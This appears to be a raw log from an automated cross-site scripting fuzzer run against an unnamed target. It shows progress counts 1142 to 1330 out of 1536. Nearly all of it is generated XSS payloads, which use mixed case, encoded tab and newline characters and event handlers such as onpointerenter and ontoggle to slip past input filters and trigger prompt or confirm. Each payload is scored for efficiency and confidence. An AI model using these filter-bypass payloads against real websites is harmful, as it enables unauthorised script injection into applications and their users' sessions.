 Efficiency: 92 
 Confidence: 10 
 Progress: 1142/1536 ------------------------------------------------------------
 Payload: <d3V%0donmouSeovEr%09=%09a=prompt,a()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1143/1536  Progress: 1144/1536 ------------------------------------------------------------
 Payload: <DETAils%09oNpOinterenTER+=+a=prompt,a()// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1145/1536 ------------------------------------------------------------
 Payload: <D3V%0aonPOINterEntEr%09=%09confirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1146/1536 ------------------------------------------------------------
 Payload: <deTaIls/+/onToggle%09=%09(confirm)()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1147/1536 ------------------------------------------------------------
 Payload: <htmL/+/onPoINTerENter%0d=%0da=prompt,a()// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1148/1536 ------------------------------------------------------------
 Payload: <htMl/+/OnpOInTeRenter%0d=%0dconfirm()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1149/1536 ------------------------------------------------------------
 Payload: <a/+/onMOusEOvEr%0d=%0da=prompt,a()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1150/1536 ------------------------------------------------------------
 Payload: <A%0donpoInTErEnter+=+confirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1151/1536 ------------------------------------------------------------
 Payload: <d3v%09oNpoinTerEnter%09=%09confirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1152/1536  Progress: 1153/1536 ------------------------------------------------------------
 Payload: <dEtAiLS%09OntoggLE+=+a=prompt,a()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1154/1536 ------------------------------------------------------------
 Payload: <A%0aoNpoInTErENTeR+=+[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 1155/1536 ------------------------------------------------------------
 Payload: <A/+/ONmousEOver%0a=%0aconfirm()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1156/1536 ------------------------------------------------------------
 Payload: <A/+/ONpointEReNTER%0a=%0a(confirm)()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1157/1536 ------------------------------------------------------------
 Payload: <d3V%0aoNmouseovEr+=+confirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1158/1536 ------------------------------------------------------------
 Payload: <dETAILS%0aontOgglE+=+[8].find(confirm)// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1159/1536 ------------------------------------------------------------
 Payload: <DETails/+/OntoGGle%0a=%0a(prompt)``%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1160/1536 ------------------------------------------------------------
 Payload: <DEtAils%0aonpoiNteRENter+=+[8].find(confirm)// 
 Efficiency: 93 
 Confidence: 10 
 Progress: 1161/1536 ------------------------------------------------------------
 Payload: <a%0donmouSeOVeR+=+a=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1162/1536 ------------------------------------------------------------
 Payload: <htMl%0aoNPoiNTErenTer+=+confirm()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1163/1536 ------------------------------------------------------------
 Payload: <HtML%0aOnpoIntereNTEr%0a=%0aa=prompt,a()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1164/1536 ------------------------------------------------------------
 Payload: <htmL%0aONPOinTerEntEr+=+confirm()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1165/1536 ------------------------------------------------------------
 Payload: <DEtAiLS/+/ONtogGle%0d=%0d[8].find(confirm)// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1166/1536 ------------------------------------------------------------
 Payload: <a%0aONmOUSeOVeR%09=%09confirm()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1167/1536 ------------------------------------------------------------
 Payload: <DEtaILs/+/ontoGgLe%0a=%0a(prompt)``// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1168/1536 ------------------------------------------------------------
 Payload: <a/+/oNmouseOvER%09=%09(confirm)()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1169/1536 ------------------------------------------------------------
 Payload: <dEtAiLS/+/OnpOINTERENTeR%0a=%0aa=prompt,a()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1170/1536  Progress: 1171/1536 ------------------------------------------------------------
 Payload: <DETaiLS%0aOnPOinTERENTER%0d=%0da=prompt,a()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1172/1536 ------------------------------------------------------------
 Payload: <hTmL%0donpOINtEreNTER%09=%09confirm()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1173/1536 ------------------------------------------------------------
 Payload: <dEtAilS%0dOnPOinTEREnteR%09=%09confirm()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1174/1536 ------------------------------------------------------------
 Payload: <htML/+/onPoinTEREnTeR%09=%09(prompt)``%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1175/1536  Progress: 1176/1536 ------------------------------------------------------------
 Payload: <A%0aoNMoUsEoveR+=+(confirm)()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1177/1536 ------------------------------------------------------------
 Payload: <d3v%0doNPoINtERentEr%0d=%0dconfirm()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1178/1536 ------------------------------------------------------------
 Payload: <D3v%0donPOIntEreNTER%0d=%0d[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 1179/1536  Progress: 1180/1536 ------------------------------------------------------------
 Payload: <d3v/+/onpOINterENTer%0d=%0dconfirm()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1181/1536 ------------------------------------------------------------
 Payload: <D3v/+/OnMoUSeovER%09=%09[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 1182/1536 ------------------------------------------------------------
 Payload: <HtML%0aONmoUSEoVeR+=+a=prompt,a()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1183/1536 ------------------------------------------------------------
 Payload: <d3v%09ONpoINTERenTeR%0a=%0a(prompt)``//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1184/1536 ------------------------------------------------------------
 Payload: <d3V%0dONpOInTEreNtER%09=%09confirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1185/1536 ------------------------------------------------------------
 Payload: <a%09onpoInTEREntEr+=+confirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1186/1536 ------------------------------------------------------------
 Payload: <dEtailS%09OntoGGle%0a=%0aa=prompt,a()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1187/1536 ------------------------------------------------------------
 Payload: <DetAiLS%09oNpoInterenTer+=+(prompt)``%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1188/1536  Progress: 1189/1536 ------------------------------------------------------------
 Payload: <DeTailS%09ONPOINTErENTeR+=+a=prompt,a()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1190/1536 ------------------------------------------------------------
 Payload: <d3v%09onpoInteREnTEr%09=%09confirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1191/1536 ------------------------------------------------------------
 Payload: <d3V%0aOnmoUSeoveR%09=%09confirm()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1192/1536 ------------------------------------------------------------
 Payload: <hTMl%0aoNMOUsEOVER%0a=%0aa=prompt,a()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1193/1536 ------------------------------------------------------------
 Payload: <D3V/+/ONMoUSeOVer%0d=%0da=prompt,a()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1194/1536 ------------------------------------------------------------
 Payload: <a/+/onpOInTERENTer%09=%09[8].find(confirm)//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 1195/1536 ------------------------------------------------------------
 Payload: <a%0doNMOusEOVeR%09=%09(confirm)()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1196/1536 ------------------------------------------------------------
 Payload: <detAilS%09onpoINtERENTeR%0a=%0a(prompt)``%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1197/1536 ------------------------------------------------------------
 Payload: <HTML%09OnPoINtErenter%0d=%0d[8].find(confirm)%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1198/1536 ------------------------------------------------------------
 Payload: <d3v%09ONMOuseoVEr%0d=%0d(prompt)``//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1199/1536 ------------------------------------------------------------
 Payload: <dETaiLS%09onToGgLE%0a=%0a[8].find(confirm)// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1200/1536 ------------------------------------------------------------
 Payload: <D3v%0aOnMoUSEOvER%0a=%0a(prompt)``//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1201/1536 ------------------------------------------------------------
 Payload: <htmL/+/ONMOUseOveR+=+[8].find(confirm)// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1202/1536 ------------------------------------------------------------
 Payload: <html%0aoNPOIntereNter%09=%09(confirm)()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1203/1536 ------------------------------------------------------------
 Payload: <d3V/+/oNPOinTEREntER%0d=%0dconfirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1204/1536 ------------------------------------------------------------
 Payload: <HTML%0dOnPOiNteRenteR%09=%09(confirm)()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1205/1536  Progress: 1206/1536 ------------------------------------------------------------
 Payload: <dETAILS%09OnToGGLE%0a=%0a[8].find(confirm)%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1207/1536 ------------------------------------------------------------
 Payload: <htML/+/onMOUseoVEr%0a=%0aconfirm()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1208/1536 ------------------------------------------------------------
 Payload: <A%0aoNMouseoVER+=+[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1209/1536 ------------------------------------------------------------
 Payload: <A%0aONmoUsEOver%09=%09confirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1210/1536 ------------------------------------------------------------
 Payload: <dEtaILS%0aONtOgGLe%0a=%0a(confirm)()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1211/1536 ------------------------------------------------------------
 Payload: <d3v%0aONMoUSeover%09=%09a=prompt,a()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1212/1536 ------------------------------------------------------------
 Payload: <DetAILs%0doNToGGlE%0d=%0da=prompt,a()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1213/1536 ------------------------------------------------------------
 Payload: <A%0aOnPoINTErEnter%0d=%0dconfirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1214/1536 ------------------------------------------------------------
 Payload: <HTML%0dONPOINTeREntER+=+a=prompt,a()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1215/1536 ------------------------------------------------------------
 Payload: <A%0dONMOuSEOvEr%09=%09confirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1216/1536  Progress: 1217/1536 ------------------------------------------------------------
 Payload: <dEtaiLS%0aOnpoiNteRENTEr%09=%09(confirm)()// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1218/1536 ------------------------------------------------------------
 Payload: <htMl%09onpointerEntEr+=+(confirm)()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1219/1536 ------------------------------------------------------------
 Payload: <D3v/+/onPOINteReNter%0d=%0d(confirm)()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1220/1536 ------------------------------------------------------------
 Payload: <D3V%0dONpOInTerENTEr+=+a=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1221/1536 ------------------------------------------------------------
 Payload: <a%0aonpoINTeReNtER%0d=%0d(prompt)``//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1222/1536 ------------------------------------------------------------
 Payload: <htML%0donmOUseoveR+=+a=prompt,a()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1223/1536 ------------------------------------------------------------
 Payload: <hTmL%0aoNmoUSeoVeR%0a=%0a[8].find(confirm)// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1224/1536  Progress: 1225/1536 ------------------------------------------------------------
 Payload: <hTMl%09ONPoinTEReNtER%09=%09confirm()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1226/1536 ------------------------------------------------------------
 Payload: <a/+/ONmOuseover%0d=%0d(prompt)``//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1227/1536 ------------------------------------------------------------
 Payload: <deTaIls%09ONToGgLe%0d=%0d(confirm)()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1228/1536 ------------------------------------------------------------
 Payload: <htML/+/oNMOuSEOVeR%0d=%0d(prompt)``%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1229/1536 ------------------------------------------------------------
 Payload: <deTAiLS%09OnpoINTerEnteR%0a=%0aconfirm()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1230/1536  Progress: 1231/1536 ------------------------------------------------------------
 Payload: <A%09OnpointeRenTEr%0d=%0d(confirm)()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1232/1536 ------------------------------------------------------------
 Payload: <d3v%09onPOINTERENtER%09=%09confirm()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1233/1536 ------------------------------------------------------------
 Payload: <hTML%09ONmouSEOveR%0d=%0da=prompt,a()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1234/1536 ------------------------------------------------------------
 Payload: <D3V/+/ONMOUSEoVer%09=%09a=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1235/1536 ------------------------------------------------------------
 Payload: <a/+/onMouseoVer%09=%09a=prompt,a()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1236/1536 ------------------------------------------------------------
 Payload: <a%09oNpOInterENtER%0d=%0dconfirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1237/1536 ------------------------------------------------------------
 Payload: <hTML%09oNPOiNterEnTeR%09=%09confirm()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1238/1536 ------------------------------------------------------------
 Payload: <htmL%0aOnpOInTErENtEr+=+[8].find(confirm)// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1239/1536 ------------------------------------------------------------
 Payload: <D3V%09oNpOINTERENteR+=+[8].find(confirm)//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 1240/1536 ------------------------------------------------------------
 Payload: <DEtaILs/+/ONPOiNtERenTER%09=%09a=prompt,a()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1241/1536 ------------------------------------------------------------
 Payload: <d3v%09OnMousEoVEr%0d=%0d(confirm)()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1242/1536 ------------------------------------------------------------
 Payload: <a%09ONmoUseoVER%0d=%0d(confirm)()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1243/1536 ------------------------------------------------------------
 Payload: <DetAIls%09ontOGgLe%09=%09[8].find(confirm)%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1244/1536 [!!] Unable to connect to the target. 
 Progress: 1245/1536 ------------------------------------------------------------
 Payload: <html%09ONPoInteReNtEr%0d=%0dconfirm()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1246/1536 ------------------------------------------------------------
 Payload: <DETAilS%0aONTOGglE%0a=%0a(prompt)``%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1247/1536 ------------------------------------------------------------
 Payload: <d3V%0aoNmoUsEOVeR%09=%09(confirm)()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1248/1536 ------------------------------------------------------------
 Payload: <D3v%09onPoINteREnTER%0d=%0d(prompt)``%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1249/1536 ------------------------------------------------------------
 Payload: <D3v%09ONMoUsEOvER%09=%09(confirm)()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1250/1536 ------------------------------------------------------------
 Payload: <htML%0aOnPOINTErENTer%09=%09[8].find(confirm)%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1251/1536 ------------------------------------------------------------
 Payload: <a%0dOnMouSeOveR%0a=%0a(prompt)``%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1252/1536 ------------------------------------------------------------
 Payload: <detaIlS%0aoNTOgGLe%0a=%0a[8].find(confirm)%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1253/1536 ------------------------------------------------------------
 Payload: <DetailS%0aONpointERentEr%09=%09confirm()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1254/1536 ------------------------------------------------------------
 Payload: <dETAiLS%0dONpOintEReNteR+=+a=prompt,a()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1255/1536 ------------------------------------------------------------
 Payload: <HTMl/+/OnPOinteREntER+=+(prompt)``%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1256/1536 ------------------------------------------------------------
 Payload: <A%09OnPOiNTEReNter%0a=%0a(prompt)``//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1257/1536 ------------------------------------------------------------
 Payload: <A%0aonpoiNTEREnTeR%0a=%0a(prompt)``%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1258/1536 ------------------------------------------------------------
 Payload: <A%0aONmOUsEovER%09=%09[8].find(confirm)//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1259/1536 ------------------------------------------------------------
 Payload: <hTmL%09ONMoUsEOVEr+=+(confirm)()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1260/1536 ------------------------------------------------------------
 Payload: <A%0aoNmouSeOVEr%0a=%0a(prompt)``//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1261/1536 ------------------------------------------------------------
 Payload: <d3v%0aONPoINTERenteR+=+confirm()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1262/1536 ------------------------------------------------------------
 Payload: <a/+/onpOINTErENTer+=+[8].find(confirm)//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 1263/1536 ------------------------------------------------------------
 Payload: <A%09ONMOUsEoVer+=+(prompt)``//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1264/1536 ------------------------------------------------------------
 Payload: <HTmL/+/ONpOINteRenTEr+=+a=prompt,a()// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1265/1536 ------------------------------------------------------------
 Payload: <a%09OnpoINTeRENTEr%09=%09(prompt)``%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1266/1536 ------------------------------------------------------------
 Payload: <HtmL%0aoNpOInTerENTER+=+(prompt)``// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1267/1536  Progress: 1268/1536 ------------------------------------------------------------
 Payload: <HTMl/+/OnmousEoVeR+=+a=prompt,a()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1269/1536 ------------------------------------------------------------
 Payload: <Html/+/ONPOiNtEREntEr%09=%09confirm()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1270/1536 ------------------------------------------------------------
 Payload: <DETailS%09ONPOINteReNter%0d=%0da=prompt,a()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1271/1536 ------------------------------------------------------------
 Payload: <dETaILS/+/oNpOINtErENtEr%0a=%0a(confirm)()// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1272/1536  Progress: 1273/1536 ------------------------------------------------------------
 Payload: <DetaIls%0aONpoiNTerentEr+=+a=prompt,a()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1274/1536 ------------------------------------------------------------
 Payload: <D3v%09OnmoUseoVeR+=+(prompt)``%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1275/1536 ------------------------------------------------------------
 Payload: <hTML%0doNmOUSeOVer%0a=%0a[8].find(confirm)%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1276/1536 ------------------------------------------------------------
 Payload: <DEtAIls%0aoNpOinteRENteR%09=%09[8].find(confirm)%0dx// 
 Efficiency: 93 
 Confidence: 10 
 Progress: 1277/1536 ------------------------------------------------------------
 Payload: <dETaiLS%0donTOggle%0d=%0d(confirm)()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1278/1536 ------------------------------------------------------------
 Payload: <dETAIls/+/ONpOINtEreNteR%0d=%0d(prompt)``// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1279/1536 ------------------------------------------------------------
 Payload: <a%09ONMOuSEOVeR%09=%09(confirm)()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1280/1536 ------------------------------------------------------------
 Payload: <dETaiLS/+/ONTOgGLe%0d=%0da=prompt,a()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1281/1536 ------------------------------------------------------------
 Payload: <d3v%0dOnpoINtereNteR%0d=%0dconfirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1282/1536 ------------------------------------------------------------
 Payload: <DetAIlS/+/OnpOINteRenter%09=%09(confirm)()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1283/1536 ------------------------------------------------------------
 Payload: <DETAiLS%0aonToGgLE%09=%09[8].find(confirm)// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1284/1536 ------------------------------------------------------------
 Payload: <A/+/OnMouSEOVeR%0d=%0d(confirm)()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1285/1536 ------------------------------------------------------------
 Payload: <dETails/+/ontogglE%0d=%0dconfirm()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1286/1536 ------------------------------------------------------------
 Payload: <d3v/+/onPOInTerenteR%09=%09(confirm)()%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 1287/1536 ------------------------------------------------------------
 Payload: <D3v%0aonpOINTeReNter%09=%09a=prompt,a()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1288/1536 ------------------------------------------------------------
 Payload: <d3v%09ONPOinTErENteR%0a=%0a[8].find(confirm)//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 1289/1536 ------------------------------------------------------------
 Payload: <a/+/onmoUsEOvEr%0d=%0da=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1290/1536 ------------------------------------------------------------
 Payload: <DETAIls%0dontOggLe%0d=%0d[8].find(confirm)%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1291/1536 ------------------------------------------------------------
 Payload: <a/+/ONpoInTERENTER+=+[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 1292/1536 ------------------------------------------------------------
 Payload: <A/+/OnpOINteRenTeR+=+a=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1293/1536 ------------------------------------------------------------
 Payload: <deTAils%0aonPOInterENteR+=+[8].find(confirm)%0dx// 
 Efficiency: 93 
 Confidence: 10 
 Progress: 1294/1536 ------------------------------------------------------------
 Payload: <D3v/+/OnpoIntERenTer+=+(prompt)``//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1295/1536 ------------------------------------------------------------
 Payload: <d3V%0aOnmOuSeOVER%0a=%0a[8].find(confirm)//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1296/1536 ------------------------------------------------------------
 Payload: <dETAIlS%0doNPoiNTerEnTer%0a=%0aconfirm()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1297/1536  Progress: 1298/1536  Progress: 1299/1536 ------------------------------------------------------------
 Payload: <d3V%09oNPOiNTErENter+=+a=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1300/1536 ------------------------------------------------------------
 Payload: <dETaILs%09OnPOiNTeREnter%09=%09confirm()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1301/1536 ------------------------------------------------------------
 Payload: <D3V%0doNmOUseoveR+=+confirm()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1302/1536 ------------------------------------------------------------
 Payload: <detaiLs%09oNPoINterenTEr+=+(prompt)``// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1303/1536 ------------------------------------------------------------
 Payload: <a%0aoNPOiNtERENTer%09=%09(prompt)``//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1304/1536 ------------------------------------------------------------
 Payload: <htmL/+/onMouseOvER%09=%09(prompt)``// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1305/1536 ------------------------------------------------------------
 Payload: <DETAILS%0doNpoIntERenTeR%0a=%0aa=prompt,a()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1306/1536 ------------------------------------------------------------
 Payload: <A/+/ONPointeREnter%0d=%0d(confirm)()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1307/1536 ------------------------------------------------------------
 Payload: <a%0aoNMOUSeoVeR+=+confirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1308/1536 ------------------------------------------------------------
 Payload: <htML%0dONmOUseoVeR%0a=%0aa=prompt,a()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1309/1536 ------------------------------------------------------------
 Payload: <HTmL%09oNmoUsEoVeR+=+[8].find(confirm)// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1310/1536 ------------------------------------------------------------
 Payload: <dETAILS%0dONpoinTerEnTer%0a=%0a(prompt)``// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1311/1536 ------------------------------------------------------------
 Payload: <DetAILS%0aONpoiNterentER%09=%09a=prompt,a()// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1312/1536 ------------------------------------------------------------
 Payload: <D3V%0doNpoINterenter%0a=%0aa=prompt,a()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1313/1536 ------------------------------------------------------------
 Payload: <HtMl%09ONpOIntEReNtEr+=+a=prompt,a()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1314/1536 ------------------------------------------------------------
 Payload: <D3v%09onPoINtERENTeR%09=%09(confirm)()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1315/1536 ------------------------------------------------------------
 Payload: <hTml%0aoNpOINterEnTer%0d=%0dconfirm()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1316/1536 ------------------------------------------------------------
 Payload: <HTmL%0aOnmouseOvER%0a=%0a[8].find(confirm)%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1317/1536 ------------------------------------------------------------
 Payload: <a/+/OnPoINTEReNtEr%09=%09confirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1318/1536 ------------------------------------------------------------
 Payload: <dETaiLs%0doNPOiNTEreNtER%0d=%0d[8].find(confirm)%0dx// 
 Efficiency: 93 
 Confidence: 10 
 Progress: 1319/1536 ------------------------------------------------------------
 Payload: <Html/+/OnpoiNTEreNtEr%0a=%0a[8].find(confirm)%0dx// 
 Efficiency: 93 
 Confidence: 10 
 Progress: 1320/1536 ------------------------------------------------------------
 Payload: <A/+/ONpointerEnTER%0d=%0d[8].find(confirm)//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 1321/1536 ------------------------------------------------------------
 Payload: <D3V%09onPOiNTErEnTEr%0d=%0d(confirm)()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1322/1536  Progress: 1323/1536 ------------------------------------------------------------
 Payload: <DETaiLs%09ONPoiNTEREnTEr%0a=%0aconfirm()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1324/1536 [!!] Unable to connect to the target. 
 Progress: 1325/1536 ------------------------------------------------------------
 Payload: <A%0aonpoINtEReNTer%0d=%0da=prompt,a()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1326/1536 ------------------------------------------------------------
 Payload: <deTaIls%09oNtOgGlE%09=%09a=prompt,a()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1327/1536 ------------------------------------------------------------
 Payload: <d3V%09OnPOInTErENTEr%0d=%0d(confirm)()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1328/1536 ------------------------------------------------------------
 Payload: <htML%0aoNmOuSeOver+=+[8].find(confirm)// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1329/1536 ------------------------------------------------------------
 Payload: <DETAILs/+/OnpOIntErEnTer%0a=%0aconfirm()// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1330/1536 ------------------------------------------------------------
